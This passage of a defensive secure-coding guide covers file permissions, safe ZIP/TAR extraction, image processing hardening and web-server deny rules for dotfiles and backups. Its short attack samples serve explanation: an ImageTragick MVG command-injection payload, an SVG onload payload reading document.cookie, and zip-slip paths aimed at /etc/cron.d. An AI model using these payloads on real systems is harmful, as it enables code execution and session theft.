    location ~* \.(bak|backup|old|orig|save|swp|tmp|sql|log|env)$ {
        deny all;
        return 404;
    }
}
```

**Apache (.htaccess or httpd.conf):**

```apache
# SECURE: Disable directory listing
Options -Indexes

# Block access to hidden files
<FilesMatch "^\.">
    Require all denied
</FilesMatch>

# Block access to backup and sensitive files
<FilesMatch "\.(bak|backup|old|orig|save|swp|tmp|sql|log|env)$">
    Require all denied
</FilesMatch>

# Block access to configuration files
<FilesMatch "\.(ini|conf|yml|yaml|toml|json|xml)$">
    Require all denied
</FilesMatch>
```

**Caddy (Caddyfile):**

```
# SECURE: Caddy disables directory listing by default
# Explicitly configure file_server without browse
example.com {
    root * /var/www/html

    file_server {
        # Do NOT add "browse" -- it enables directory listing
        hide .git .env *.bak *.sql *.log
    }

    # Block hidden files and directories
    @hidden path */.* */.*/*
    respond @hidden 404
}
```

### Framework-Level Prevention

**TypeScript (Express):**

```typescript
// SECURE: Serve static files with dotfiles and directory listing restrictions
import express from "express";

app.use(
  "/static",
  express.static("public", {
    dotfiles: "deny",     // Reject requests for dotfiles (.env, .git)
    index: false,          // Do not serve index files (prevents directory listing)
    redirect: false,       // Do not redirect directories
    setHeaders: (res) => {
      res.setHeader("X-Content-Type-Options", "nosniff");
    },
  })
);

// Catch-all: return 404 for non-existent routes (prevents directory probing)
app.use((req, res) => {
  res.status(404).json({ error: "Not found" });
});
```

---

## 8. File Permission Security (CWE-732)

**What it is:** Incorrect file permissions allow unauthorized users to read, modify, or execute files. Files containing secrets, configuration, or application data must have permissions restricted to the minimum necessary.

### Principle of Least Privilege for Files

```
Permission guidelines:
  Private keys, secrets:    0400 (owner read only) or 0600 (owner read/write)
  Configuration files:      0640 (owner read/write, group read)
  Application binaries:     0750 (owner all, group read/execute)
  Log files:                0640 (owner read/write, group read)
  Upload directories:       0750 (owner all, group read/execute)
  Uploaded files:           0640 (owner read/write, group read)
  Temporary files:          0600 (owner read/write only)
  Public static files:      0644 (owner read/write, world read)

  NEVER:
    0777 (world read/write/execute) on ANY file
    0666 (world read/write) on sensitive files
    Executable bit on uploaded files
```

### Setting Permissions Securely

**TypeScript:**

```typescript
// SECURE: Set restrictive permissions when creating files
import { writeFile, chmod, chown } from "fs/promises";

async function writeSecretFile(path: string, content: string): Promise<void> {
  // Write file with restrictive permissions (owner read/write only)
  await writeFile(path, content, { mode: 0o600 });
}

async function writeConfigFile(path: string, content: string): Promise<void> {
  // Config files: owner read/write, group read
  await writeFile(path, content, { mode: 0o640 });
}
```

**Python:**

```python
# SECURE: Set permissions on file creation
import os
import stat

def write_secret_file(path: str, content: str) -> None:
    """Write a secrets file with restrictive permissions."""
    # Set umask to ensure no group/other permissions
    old_umask = os.umask(0o077)
    try:
        fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        try:
            os.write(fd, content.encode())
        finally:
            os.close(fd)
    finally:
        os.umask(old_umask)

def verify_file_permissions(path: str, expected_mode: int) -> bool:
    """Verify a file has the expected permissions."""
    file_stat = os.stat(path)
    actual_mode = stat.S_IMODE(file_stat.st_mode)
    return actual_mode == expected_mode
```

**Go:**

```go
// SECURE: Verify file ownership and permissions before reading
import (
    "fmt"
    "os"
    "syscall"
)

func verifyAndReadSecret(path string, expectedUID uint32) ([]byte, error) {
    info, err := os.Lstat(path) // Lstat does NOT follow symlinks
    if err != nil {
        return nil, err
    }

    // Verify it is a regular file (not symlink, directory, etc.)
    if !info.Mode().IsRegular() {
        return nil, fmt.Errorf("not a regular file: %s", path)
    }

    // Verify permissions are restrictive (0600 or stricter)
    perm := info.Mode().Perm()
    if perm&0o077 != 0 {
        return nil, fmt.Errorf(
            "file %s has insecure permissions %o (expected 0600 or stricter)", path, perm,
        )
    }

    // Verify ownership
    stat := info.Sys().(*syscall.Stat_t)
    if stat.Uid != expectedUID {
        return nil, fmt.Errorf("file %s owned by UID %d, expected %d", path, stat.Uid, expectedUID)
    }

    return os.ReadFile(path)
}
```

### umask Settings

```bash
# Set umask in application startup scripts
# 0077: new files get 0600 (rw-------), new directories get 0700 (rwx------)
umask 0077

# 0027: new files get 0640 (rw-r-----), new directories get 0750 (rwxr-x---)
umask 0027

# Verify in Dockerfile
RUN umask 0077 && your-application-start
```

---

## 9. Archive Extraction Security (CWE-409)

**What it is:** Extracting user-supplied archives (ZIP, TAR, RAR, 7z) introduces three major risks: zip slip (path traversal via archive entry names), zip bombs (decompression bombs that expand to enormous size), and tar symlink attacks (symlinks in archives that point outside the extraction directory).

### Zip Slip (Path Traversal in Archives)

Archive entries can contain path traversal sequences. When extracted naively, an entry named `../../../../etc/cron.d/backdoor` writes outside the intended directory.

**Vulnerable Code (Python):**

```python
# VULNERABLE: Extracts archive without validating entry paths
import zipfile

def extract_zip_vulnerable(zip_path: str, dest_dir: str) -> None:
    with zipfile.ZipFile(zip_path) as zf:
        # NEVER DO THIS -- entries can contain ../../../
        zf.extractall(dest_dir)
```

**Secure Code (Python):**

```python
# SECURE: Validate every entry path before extraction
import zipfile
import os

def safe_extract_zip(zip_path: str, dest_dir: str) -> list[str]:
    """Extract ZIP with path traversal prevention and size limits."""
    MAX_FILES = 10000
    MAX_TOTAL_SIZE = 500 * 1024 * 1024  # 500 MB
    MAX_RATIO = 100  # Compression ratio limit (zip bomb detection)

    dest_dir = os.path.realpath(dest_dir)
    extracted = []
    total_size = 0

    with zipfile.ZipFile(zip_path) as zf:
        # Step 1: Check file count (zip bomb indicator)
        if len(zf.namelist()) > MAX_FILES:
            raise ValueError(f"Archive contains too many files: {len(zf.namelist())}")

        archive_size = os.path.getsize(zip_path)

        for info in zf.infolist():
            # Step 2: Skip directories
            if info.is_dir():
                continue

            # Step 3: Validate entry name -- no path traversal
            entry_path = os.path.realpath(os.path.join(dest_dir, info.filename))
            if not entry_path.startswith(dest_dir + os.sep):
                raise ValueError(f"Path traversal detected: {info.filename}")

            # Step 4: Check total extracted size (zip bomb detection)
            total_size += info.file_size
            if total_size > MAX_TOTAL_SIZE:
                raise ValueError("Archive exceeds maximum extraction size")

            # Step 5: Check compression ratio (zip bomb detection)
            if archive_size > 0 and info.compress_size > 0:
                ratio = info.file_size / info.compress_size
                if ratio > MAX_RATIO:
                    raise ValueError(
                        f"Suspicious compression ratio {ratio:.0f}:1 for {info.filename}"
                    )

            # Step 6: Create parent directories
            os.makedirs(os.path.dirname(entry_path), exist_ok=True)

            # Step 7: Extract the file
            with zf.open(info) as src, open(entry_path, "wb") as dst:
                dst.write(src.read())

            extracted.append(entry_path)

    return extracted
```

**Go:**

```go
// SECURE: Safe ZIP extraction with path traversal and zip bomb prevention
import (
    "archive/zip"
    "io"
    "os"
    "path/filepath"
    "strings"
)

const (
    maxFiles     = 10000
    maxTotalSize = 500 << 20 // 500 MB
    maxRatio     = 100
)

func SafeExtractZip(zipPath, destDir string) ([]string, error) {
    destDir, err := filepath.Abs(destDir)
    if err != nil {
        return nil, err
    }

    reader, err := zip.OpenReader(zipPath)
    if err != nil {
        return nil, err
    }
    defer reader.Close()

    if len(reader.File) > maxFiles {
        return nil, fmt.Errorf("archive contains too many files: %d", len(reader.File))
    }

    var extracted []string
    var totalSize uint64

    for _, f := range reader.File {
        // Step 1: Resolve and validate the target path
        target := filepath.Join(destDir, f.Name)
        target = filepath.Clean(target)

        if !strings.HasPrefix(target, destDir+string(filepath.Separator)) {
            return nil, fmt.Errorf("path traversal detected: %s", f.Name)
        }

        // Step 2: Check total extraction size
        totalSize += f.UncompressedSize64
        if totalSize > maxTotalSize {
            return nil, fmt.Errorf("archive exceeds maximum extraction size")
        }

        // Step 3: Skip symlinks in the archive
        if f.Mode()&os.ModeSymlink != 0 {
            continue // Do not extract symlinks
        }

        if f.FileInfo().IsDir() {
            os.MkdirAll(target, 0750)
            continue
        }

        // Step 4: Create parent directory and extract
        os.MkdirAll(filepath.Dir(target), 0750)
        if err := extractFile(f, target); err != nil {
            return nil, err
        }

        extracted = append(extracted, target)
    }

    return extracted, nil
}

func extractFile(f *zip.File, target string) error {
    src, err := f.Open()
    if err != nil {
        return err
    }
    defer src.Close()

    dst, err := os.OpenFile(target, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0640)
    if err != nil {
        return err
    }
    defer dst.Close()

    // Limit extraction size per file
    _, err = io.Copy(dst, io.LimitReader(src, int64(maxTotalSize)))
    return err
}
```

**Java:**

```java
// SECURE: Safe ZIP extraction in Java
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.Files;

public List<Path> safeExtractZip(Path zipFile, Path destDir) throws IOException {
    destDir = destDir.toRealPath();
    List<Path> extracted = new ArrayList<>();
    long totalSize = 0;
    int fileCount = 0;
    final long MAX_TOTAL_SIZE = 500L * 1024 * 1024; // 500 MB
    final int MAX_FILES = 10000;

    try (ZipInputStream zis = new ZipInputStream(Files.newInputStream(zipFile))) {
        ZipEntry entry;
        while ((entry = zis.getNextEntry()) != null) {
            fileCount++;
            if (fileCount > MAX_FILES) {
                throw new IOException("Archive contains too many files");
            }

            // Validate path -- prevent zip slip
            Path targetPath = destDir.resolve(entry.getName()).normalize();
            if (!targetPath.startsWith(destDir)) {
                throw new IOException("Path traversal detected: " + entry.getName());
            }

            if (entry.isDirectory()) {
                Files.createDirectories(targetPath);
                continue;
            }

            // Check total extraction size
            totalSize += entry.getSize();
            if (totalSize > MAX_TOTAL_SIZE) {
                throw new IOException("Archive exceeds maximum extraction size");
            }

            // Extract the file
            Files.createDirectories(targetPath.getParent());
            Files.copy(zis, targetPath);
            extracted.add(targetPath);
        }
    }

    return extracted;
}
```

### Tar Symlink Attacks

TAR archives can contain symlinks. If a symlink entry is extracted first, subsequent file entries can follow the symlink and write outside the destination directory.

```python
# SECURE: Safe TAR extraction -- skip symlinks and hardlinks
import tarfile
import os

def safe_extract_tar(tar_path: str, dest_dir: str) -> list[str]:
    """Extract TAR archive with symlink and path traversal prevention."""
    dest_dir = os.path.realpath(dest_dir)
    extracted = []

    with tarfile.open(tar_path, "r:*") as tf:
        for member in tf.getmembers():
            # Step 1: Skip symlinks and hardlinks entirely
            if member.issym() or member.islnk():
                continue

            # Step 2: Validate the target path
            target = os.path.realpath(os.path.join(dest_dir, member.name))
            if not target.startswith(dest_dir + os.sep):
                raise ValueError(f"Path traversal detected: {member.name}")

            # Step 3: Set safe permissions (remove setuid/setgid/sticky)
            member.mode = member.mode & 0o755

            # Step 4: Extract
            tf.extract(member, dest_dir)
            extracted.append(target)

    return extracted
```

### Zip Bomb Detection

Zip bombs are archives with extreme compression ratios. A 42 KB ZIP file can expand to 4.5 petabytes. Detect them by checking the compression ratio and total decompressed size before extraction.

```
Zip bomb indicators:
  1. High compression ratio (>100:1 for most content types)
  2. Total uncompressed size exceeds threshold (e.g., 500 MB)
  3. Nested archives (zip within zip within zip)
  4. Extremely large number of entries (>10,000)

Defense:
  - Check total uncompressed size before extraction
  - Check compression ratio per entry
  - Limit total number of entries
  - Limit extraction time
  - Do NOT recursively extract nested archives
```

---

## 10. Image Processing Security

**What it is:** Image processing is a high-risk operation because image parsers are complex (supporting dozens of formats, metadata fields, and compression schemes), image files can embed executable content, and image processing libraries have a history of critical vulnerabilities.

### ImageTragick (CVE-2016-3714)

ImageMagick's `convert` command interprets certain filenames as commands, allowing code execution through crafted image files.

```
Attack vector:
  A file named "exploit.mvg" containing:
    push graphic-context
    viewbox 0 0 640 480
    image over 0,0 0,0 'https://example.com/image.jpg"|ls "-la'
    pop graphic-context

  When ImageMagick processes this file, it executes: ls -la
```

### Safe Image Processing Configuration

**ImageMagick Policy (policy.xml):**

```xml
<!-- /etc/ImageMagick-7/policy.xml -->
<!-- SECURE: Restrict ImageMagick capabilities -->
<policymap>
  <!-- Disable vulnerable coders -->
  <policy domain="coder" rights="none" pattern="EPHEMERAL" />
  <policy domain="coder" rights="none" pattern="URL" />
  <policy domain="coder" rights="none" pattern="HTTPS" />
  <policy domain="coder" rights="none" pattern="HTTP" />
  <policy domain="coder" rights="none" pattern="MVG" />
  <policy domain="coder" rights="none" pattern="MSL" />
  <policy domain="coder" rights="none" pattern="TEXT" />
  <policy domain="coder" rights="none" pattern="LABEL" />
  <policy domain="coder" rights="none" pattern="PS" />
  <policy domain="coder" rights="none" pattern="EPS" />
  <policy domain="coder" rights="none" pattern="PDF" />
  <policy domain="coder" rights="none" pattern="XPS" />

  <!-- Resource limits to prevent decompression bombs -->
  <policy domain="resource" name="memory" value="256MiB" />
  <policy domain="resource" name="map" value="512MiB" />
  <policy domain="resource" name="width" value="16KP" />
  <policy domain="resource" name="height" value="16KP" />
  <policy domain="resource" name="area" value="128MP" />
  <policy domain="resource" name="disk" value="1GiB" />
  <policy domain="resource" name="file" value="768" />
  <policy domain="resource" name="thread" value="4" />
  <policy domain="resource" name="time" value="120" />

  <!-- Only allow specific formats -->
  <policy domain="coder" rights="read|write" pattern="{JPEG,PNG,GIF,WEBP}" />
</policymap>
```

### Safe Image Processing Libraries

Prefer dedicated image libraries over ImageMagick when possible.

**TypeScript (sharp -- libvips-based, safer than ImageMagick):**

```typescript
// SECURE: Use sharp for image processing -- built on libvips, not ImageMagick
import sharp from "sharp";

interface ImageConstraints {
  maxWidth: number;
  maxHeight: number;
  maxSizeBytes: number;
  allowedFormats: string[];
}

const DEFAULT_CONSTRAINTS: ImageConstraints = {
  maxWidth: 4096,
  maxHeight: 4096,
  maxSizeBytes: 10 * 1024 * 1024, // 10 MB
  allowedFormats: ["jpeg", "png", "webp", "gif"],
};

async function processImage(
  inputBuffer: Buffer,
  constraints: ImageConstraints = DEFAULT_CONSTRAINTS
): Promise<Buffer> {
  // Step 1: Validate input size
  if (inputBuffer.length > constraints.maxSizeBytes) {
    throw new Error("Image exceeds maximum size");
  }

  // Step 2: Read metadata without fully decoding the image
  const metadata = await sharp(inputBuffer).metadata();

  // Step 3: Validate format
  if (!metadata.format || !constraints.allowedFormats.includes(metadata.format)) {
    throw new Error(`Image format ${metadata.format} not allowed`);
  }

  // Step 4: Validate dimensions (prevents decompression bombs)
  if (
    (metadata.width && metadata.width > constraints.maxWidth) ||
    (metadata.height && metadata.height > constraints.maxHeight)
  ) {
    throw new Error("Image dimensions exceed maximum");
  }

  // Step 5: Re-encode the image (strips all metadata including EXIF)
  return sharp(inputBuffer)
    .resize(constraints.maxWidth, constraints.maxHeight, {
      fit: "inside",
      withoutEnlargement: true,
    })
    .removeMetadata() // Strip EXIF, GPS, camera info, thumbnails
    .toFormat("webp", { quality: 80 })
    .toBuffer();
}
```

**Python (Pillow):**

```python
# SECURE: Image processing with Pillow -- resource limits and metadata stripping
from PIL import Image
import io

# Set decompression bomb limit (default is 89 million pixels)
Image.MAX_IMAGE_PIXELS = 50_000_000  # 50 million pixels

ALLOWED_FORMATS = frozenset({"JPEG", "PNG", "GIF", "WEBP"})
MAX_DIMENSION = 4096

def process_image(image_bytes: bytes) -> bytes:
    """Process an image safely: validate, resize, strip metadata, re-encode."""
    img = Image.open(io.BytesIO(image_bytes))

    # Step 1: Validate format
    if img.format not in ALLOWED_FORMATS:
        raise ValueError(f"Image format {img.format} not allowed")

    # Step 2: Validate dimensions
    if img.width > MAX_DIMENSION or img.height > MAX_DIMENSION:
        raise ValueError("Image dimensions exceed maximum")

    # Step 3: Strip all metadata (EXIF, GPS, camera info)
    data = list(img.getdata())
    clean_img = Image.new(img.mode, img.size)
    clean_img.putdata(data)

    # Step 4: Resize if needed
    clean_img.thumbnail((MAX_DIMENSION, MAX_DIMENSION), Image.LANCZOS)

    # Step 5: Re-encode to strip any embedded payloads
    output = io.BytesIO()
    clean_img.save(output, format="WEBP", quality=80)
    return output.getvalue()
```

### SVG XSS Prevention

SVG files are XML and can contain JavaScript. Never serve user-uploaded SVGs inline or with a text/html Content-Type.

```
SVG XSS attack:
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
    <text x="10" y="50">Innocent image</text>
  </svg>

Defense:
  1. Do not accept SVG uploads unless absolutely necessary
  2. If SVGs must be accepted, sanitize with DOMPurify or similar
  3. Serve SVGs with Content-Type: image/svg+xml (not text/html)
  4. Serve from a separate domain (no cookies, no same-origin)
  5. Set Content-Security-Policy to block inline scripts
  6. Convert SVGs to raster format (PNG) on upload
```

```typescript
// SECURE: SVG sanitization with DOMPurify (server-side)
import createDOMPurify from "dompurify";
import { JSDOM } from "jsdom";

const window = new JSDOM("").window;
const DOMPurify = createDOMPurify(window);

function sanitizeSvg(svgContent: string): string {
  return DOMPurify.sanitize(svgContent, {
    USE_PROFILES: { svg: true, svgFilters: true },
    // Remove all event handlers and scripts
    FORBID_TAGS: ["script", "foreignObject", "iframe", "embed", "object"],
    FORBID_ATTR: [
      "onload", "onerror", "onclick", "onmouseover",
      "onfocus", "onblur", "xlink:href",
    ],
  });
}
```

### EXIF Data Leakage

EXIF metadata in photos can contain GPS coordinates, camera serial numbers, timestamps, and thumbnails. Always strip EXIF data from user uploads before serving them.

```python
# SECURE: Strip EXIF data from JPEG images
from PIL import Image
import io

def strip_exif(image_bytes: bytes) -> bytes:
    """Remove all EXIF metadata from a JPEG image."""
    img = Image.open(io.BytesIO(image_bytes))

    # Create a new image without metadata
    data = list(img.getdata())
    clean = Image.new(img.mode, img.size)
    clean.putdata(data)

    output = io.BytesIO()
    clean.save(output, format=img.format, quality=95)
    return output.getvalue()
```

### Image Decompression Bomb Prevention

A decompression bomb is a small compressed image that expands to enormous dimensions when decoded. A 100 KB PNG can decompress to 10 GB of memory.

```
Decompression bomb defense:
  1. Check image dimensions BEFORE decoding the pixel data
  2. Set maximum pixel count limits (e.g., 50 million pixels)
  3. Set memory limits in the image processing library
  4. Process images in a sandboxed process or container with memory limits

  Pillow:  Image.MAX_IMAGE_PIXELS = 50_000_000
  Sharp:   sharp(input).metadata() -- check dimensions before processing
  ImageMagick: policy.xml resource limits (see above)
```

---

## Best Practices

### 1. Validate File Type by Magic Bytes, Not Extension or Content-Type

File extensions and Content-Type headers are trivially spoofed by attackers. The only reliable method for determining file type is inspecting the file's magic bytes (file signature). Use libraries like `python-magic`, `file-type` (npm), or `net/http.DetectContentType` (Go) for detection. Maintain an explicit allowlist of permitted MIME types and reject anything not on the list.

### 2. Store Uploads Outside the Webroot with UUID Filenames

Never store uploaded files in a directory served by the web server. Use object storage (S3, GCS, Azure Blob) or a directory outside the webroot. Replace user-supplied filenames with UUIDs to prevent path traversal, name collision, and filename-based attacks. Store the original filename in the database if needed for display.

### 3. Canonicalize Paths and Verify Containment Before Every File Operation

Before reading, writing, or deleting any file, resolve the path to its canonical form using `realpath()` / `toRealPath()` / `filepath.EvalSymlinks()`, then verify that the resolved path starts with the expected base directory. This prevents path traversal via `../`, symlinks, and encoded sequences. Apply this check at every entry point, not just upload handlers.

### 4. Never Use User Input to Determine File Inclusion Paths

Map user input to predefined template or file paths using an allowlist or lookup table. Never concatenate, interpolate, or format user input into file system paths used by template engines, `include()` statements, or file serving functions. If the set of valid paths is known at build time, define them as constants.

### 5. Create Temporary Files Atomically with Restrictive Permissions

Use `mkstemp()` / `os.CreateTemp()` / `Files.createTempFile()` instead of constructing temp filenames manually. These functions atomically create the file with mode 0600, eliminating race conditions. Always use `try/finally` or `defer` to guarantee cleanup. Never assume temp files will be cleaned up by the OS.

### 6. Use O_NOFOLLOW and File Descriptor Operations to Prevent Symlink Attacks

When operating on files in shared or world-writable directories (like `/tmp`), use the `O_NOFOLLOW` flag to prevent symlink traversal. After opening a file, perform all checks (ownership, permissions, type) on the file descriptor using `fstat()`, not on the path. This eliminates TOCTOU race conditions.

### 7. Validate Every Archive Entry Before Extraction

Before extracting any entry from a ZIP, TAR, or other archive, verify that the resolved extraction path remains within the destination directory. Skip symlinks and hardlinks in archives. Enforce limits on total extraction size, compression ratio, and entry count. Never recursively extract nested archives.

### 8. Strip Metadata and Re-encode All Uploaded Images

EXIF data in images can contain GPS coordinates, camera identifiers, and thumbnails of cropped-out content. SVG files can contain JavaScript. Always strip metadata and re-encode images to a safe format after upload. Use libraries like sharp (Node.js) or Pillow (Python) that do not execute embedded code. Serve images from a separate cookie-less domain.

### 9. Disable Directory Listing and Block Access to Sensitive File Types

Configure web servers to disable directory indexing (`autoindex off` in Nginx, `Options -Indexes` in Apache). Block access to hidden files (`.env`, `.git`), backup files (`.bak`, `.sql`), and configuration files (`.yml`, `.json`). Apply this at both the web server and application framework levels.

### 10. Enforce Least Privilege File Permissions and Verify Before Operations

Set the most restrictive permissions possible on every file. Secrets and private keys: 0400 or 0600. Configuration: 0640. Uploaded files: 0640 with no executable bit. Set `umask 0077` in application startup. Before reading sensitive files, verify the file's ownership and permissions match expectations.

---

## Anti-Patterns

### 1. Relying on File Extension for Type Validation

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Checking only the file extension (`.jpg`, `.png`) to validate upload type | Attacker renames `shell.php` to `shell.jpg` and uploads it. If the web server is misconfigured, it executes the PHP file. | Validate file type using magic bytes (file signatures). Use `python-magic`, `file-type`, or `net/http.DetectContentType`. |

### 2. Storing Uploads Inside the Webroot

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Saving uploaded files to `/public/uploads/` or a directory served by the web server | Uploaded web shells are directly accessible and executed by the web server. Full server compromise. | Store uploads outside the webroot or in object storage (S3). Serve via signed URLs or through an application endpoint that validates authorization. |

### 3. Using User-Supplied Filenames for Storage

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Saving files with the original filename provided by the user | Path traversal (`../../etc/cron.d/backdoor`), overwriting existing files, null byte truncation, double extension attacks | Generate UUID filenames. Store the original name in the database for display only. |

### 4. Joining Paths Without Canonicalization

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Using `path.join(baseDir, userInput)` without resolving and checking the result | `path.join` does not prevent `../` traversal. Attacker reads or writes arbitrary files. | After joining, resolve with `realpath()` and verify the result starts with the base directory. |

### 5. Extracting Archives Without Path Validation

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Calling `zipfile.extractall()` or `tar.extractall()` on user-supplied archives without validating entry paths | Zip slip: archive entries with `../` overwrite arbitrary files on the server. Tar symlink attacks create symlinks to sensitive locations. | Validate every entry's resolved path. Skip symlinks. Enforce extraction size limits. |

### 6. Processing Images Without Size Limits

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Passing user-uploaded images to ImageMagick, Pillow, or sharp without dimension or size limits | Decompression bombs: a small file expands to gigabytes of memory, crashing the server. ImageTragick: crafted images execute commands. | Set `Image.MAX_IMAGE_PIXELS` (Pillow), configure `policy.xml` (ImageMagick), check dimensions before processing (sharp). |

### 7. Serving SVG Uploads Without Sanitization

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Accepting SVG uploads and serving them inline or as `text/html` | SVG files can contain JavaScript: `<svg onload="alert(document.cookie)">`. XSS via uploaded image. | Sanitize SVGs with DOMPurify, serve with `Content-Type: image/svg+xml`, serve from a separate domain, or convert to raster format on upload. |

### 8. Creating Temp Files with Predictable Names in Shared Directories

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Using `mktemp()` (name only, no file creation), predictable naming patterns, or writing to `/tmp` with fixed filenames | Race condition: attacker creates a symlink at the predicted path before the application creates the file. Application writes to attacker-controlled location. | Use `mkstemp()` / `os.CreateTemp()` / `tempfile.NamedTemporaryFile()` for atomic creation. Use temp directories with 0700 permissions. |

---

## Enforcement Checklist

### File Upload Validation (CWE-434)
- [ ] File type validated by magic bytes (file signatures), not extension or Content-Type alone
- [ ] Allowlist of permitted MIME types defined and enforced
- [ ] File size limits enforced at reverse proxy, framework, and application levels
- [ ] Filenames sanitized: directory separators, null bytes, and unicode tricks removed
- [ ] Double extension attacks prevented (only last extension considered, or UUID naming used)
- [ ] Content-Type header validated against detected magic bytes

### File Storage Security
- [ ] Uploads stored outside the webroot (separate directory or object storage)
- [ ] UUID filenames used for all stored files (original name in database only)
- [ ] Signed URLs used for authorized file access (time-limited, per-user)
- [ ] Virus/malware scanning integrated into upload pipeline (ClamAV or VirusTotal)
- [ ] Files served with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`
- [ ] Uploads served from a separate domain (no cookies, no same-origin with the application)

### Path Traversal Prevention (CWE-22)
- [ ] All user-supplied path components pass through `path.basename()` / `filepath.Base()`
- [ ] Paths canonicalized with `realpath()` / `toRealPath()` / `filepath.EvalSymlinks()`
- [ ] Containment verified: resolved path must start with the intended base directory
- [ ] URL-encoded path separators (`%2f`, `%5c`, `%2e`) handled (decoded before validation)
- [ ] Null bytes stripped from all file path inputs
- [ ] Path traversal checks applied at every file operation entry point, not just uploads

### File Inclusion Prevention (CWE-98)
- [ ] Template and include paths determined by allowlist, not user input
- [ ] PHP `allow_url_include` and `allow_url_fopen` disabled (if PHP is used)
- [ ] No user input concatenated into `include()`, `require()`, or template paths
- [ ] Dynamic file selection uses a lookup map from user keys to predefined paths

### Temporary File Security (CWE-377)
- [ ] Temporary files created with `mkstemp()` / `os.CreateTemp()` / `tempfile.NamedTemporaryFile()`
- [ ] Temporary file permissions set to 0600 (owner read/write only)
- [ ] Cleanup guaranteed via `finally` blocks, `defer`, or context managers
- [ ] No use of `mktemp()` (name-only) or predictable temp file names
- [ ] Temporary directories created with `mkdtemp()` / `os.MkdirTemp()` with mode 0700

### Symlink Attack Prevention (CWE-367)
- [ ] `O_NOFOLLOW` used when opening files in shared directories
- [ ] File properties checked via `fstat()` on file descriptors, not `stat()` on paths
- [ ] Symlinks not followed during path resolution (or resolved and containment verified)
- [ ] Files created in application-owned directories with restrictive permissions

### Directory Listing Prevention (CWE-548)
- [ ] Directory indexing disabled in web server configuration (Nginx, Apache, Caddy)
- [ ] Access blocked for hidden files (`.env`, `.git`, `.htaccess`)
- [ ] Access blocked for backup files (`.bak`, `.sql`, `.old`, `.swp`)
- [ ] Framework static file middleware configured with `dotfiles: "deny"` and `index: false`

### File Permission Security (CWE-732)
- [ ] Secrets and private keys: permissions 0400 or 0600
- [ ] Configuration files: permissions 0640
- [ ] Upload directories: permissions 0750, no executable bit on contents
- [ ] umask set to 0077 (or 0027) in application startup
- [ ] Ownership verified before reading sensitive files
- [ ] No file anywhere in the system has permissions 0777

### Archive Extraction Security (CWE-409)
- [ ] Every archive entry path validated for traversal before extraction
- [ ] Symlinks and hardlinks in archives are skipped (not extracted)
- [ ] Total extraction size limited (e.g., 500 MB)
- [ ] Compression ratio checked per entry (flag ratios >100:1)
- [ ] Entry count limited (e.g., 10,000 files maximum)
- [ ] Nested archives are not recursively extracted

### Image Processing Security
- [ ] Images validated by magic bytes before processing
- [ ] Image dimensions checked before decoding (decompression bomb prevention)
- [ ] `Image.MAX_IMAGE_PIXELS` set (Pillow) or `policy.xml` configured (ImageMagick)
- [ ] ImageMagick delegates and coders restricted (URL, HTTPS, MVG, MSL disabled)
- [ ] EXIF and metadata stripped from all uploaded images before serving
- [ ] SVG uploads sanitized or converted to raster format
- [ ] Images re-encoded on upload (strips embedded payloads)
- [ ] Image processing runs in a sandboxed environment with memory limits

### Cross-Cutting Enforcement
- [ ] Static analysis tools (semgrep, CodeQL) scan for path traversal and unsafe file operations
- [ ] File upload endpoints covered by integration tests with malicious filenames and payloads
- [ ] Penetration testing includes file upload, path traversal, and archive extraction attacks
- [ ] Web server hardening reviewed: directory listing, dotfiles, backup files
- [ ] Dependency scanner monitors image processing libraries for vulnerabilities

---

## CWE Reference Map

| Vulnerability | CWE | OWASP Top 10 |
|---------------|-----|-------------|
| Unrestricted File Upload | CWE-434 | A04:2021 Insecure Design |
| Path Traversal | CWE-22 | A01:2021 Broken Access Control |
| File Inclusion (LFI/RFI) | CWE-98 | A03:2021 Injection |
| Insecure Temporary File | CWE-377 | A01:2021 Broken Access Control |
| TOCTOU Race Condition | CWE-367 | A01:2021 Broken Access Control |
| Directory Listing | CWE-548 | A05:2021 Security Misconfiguration |
| Incorrect Permissions | CWE-732 | A01:2021 Broken Access Control |
| Zip Bomb (Decompression) | CWE-409 | A05:2021 Security Misconfiguration |
| Zip Slip (Archive Traversal) | CWE-22 | A01:2021 Broken Access Control |
| Reliance on File Extension | CWE-646 | A04:2021 Insecure Design |
| Content-Type Spoofing | CWE-351 | A04:2021 Insecure Design |
